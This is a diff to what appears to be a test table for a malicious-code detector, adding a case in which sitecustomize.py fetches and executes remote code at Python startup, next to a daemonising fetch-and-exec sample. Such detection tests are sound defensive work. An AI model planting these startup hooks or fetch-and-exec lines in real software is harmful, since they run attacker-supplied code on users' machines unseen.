@@ -171,6 +171,11 @@ CASES = {
         "import os\nos.environ.setdefault('X', '1')",
         "# nothing runs here",
     ),
+    "startup_hook_payload": (
+        "sitecustomize.py",
+        "from urllib.request import urlopen\nexec(urlopen(U).read())",
+        "import os\nos.environ.setdefault('X', '1')",
+    ),
     "py_daemon_fetch_exec": (
         "x.py",
         "if os.fork():\n    raise SystemExit\nos.setsid()\nexec(urlopen(U).read())",
